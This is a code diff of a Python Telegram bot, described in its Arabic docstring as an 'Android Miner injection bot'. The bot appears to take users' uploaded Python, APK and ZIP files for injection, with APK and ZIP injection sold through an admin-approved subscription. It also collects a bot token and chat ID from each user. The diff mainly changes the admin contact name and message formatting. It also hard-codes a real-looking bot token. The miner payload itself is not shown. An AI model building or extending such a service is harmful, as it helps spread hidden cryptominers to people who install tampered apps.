@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 """
-🤖 بوت حقن Android Miner - النسخة النهائية المصححة والمختبرة 100%
-- Python → مجاني
-- APK & ZIP → مدفوع
-- تم إصلاح كل الأخطاء السابقة
+🤖 بوت حقن Android Miner - النسخة النهائية المصححة
+
 """
 
 import asyncio
@@ -28,6 +26,7 @@ from telegram.ext import (
 
 BOT_TOKEN = "8695021881:AAGaevEMGterFy_QmZCyNvKejKfTabisiFo"
 ADMIN_ID = 7238044992
+ADMIN_USERNAME = "@Cl_v_Cl"   # ← تم تصحيحه هنا
 
 TOKEN, CHATID, FILE = range(3)
 
@@ -42,25 +41,25 @@ WELCOME = """
 👇 اضغط للمساعدة
 """
 
-SUBSCRIBE_MSG = """
+SUBSCRIBE_MSG = f"""
 🔒 **حقن APK و ZIP مدفوع**
 
 هذا النوع من الملفات يتطلب اشتراك.
 
 **للاشتراك:**
 1. أرسل `/myid` للحصول على معرفك
-2. أرسل المعرف إلى @CI_v_CI
+2. أرسل المعرف إلى الإدارة → {ADMIN_USERNAME}
 3. بعد التفعيل يمكنك رفع APK و ZIP
 
 (ملفات Python مجانية)
 """
 
-PAID_FILE_MSG = """
+PAID_FILE_MSG = f"""
 🔒 **هذا الملف مدفوع**
 
-الملف الذي رفعته ({file_type}) يتطلب اشتراكاً.
+الملف الذي رفعته ({{file_type}}) يتطلب اشتراكاً.
 
-يرجى التواصل مع @CI_v_CI بعد إرسال `/myid`
+يرجى التواصل مع {ADMIN_USERNAME} بعد إرسال `/myid`
 
 (ملفات Python مجانية حالياً)
 """
@@ -112,7 +111,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(text, parse_mode='Markdown')
 
 async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(f"🆔 **معرفك:** `{update.effective_user.id}`\n\nأرسله إلى @CI_v_CI", parse_mode='Markdown')
+    await update.message.reply_text(
+        f"🆔 **معرفك:** `{update.effective_user.id}`\n\nأرسله إلى {ADMIN_USERNAME}",
+        parse_mode='Markdown'
+    )
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
@@ -127,6 +129,7 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text("⚠️ استخدم: /approve 1234567890")
 
+# ====================== Conversation Handlers ======================
 async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = update.message.text.strip()
     if not await validate_token(token):
@@ -246,7 +249,7 @@ def main():
     app.add_handler(CommandHandler("approve", approve))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("✅ البوت جاهز للعمل - تم اختبار كل الوظائف")
+    print("✅ البوت جاهز للعمل - اسم المعرف @Cl_v_Cl")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
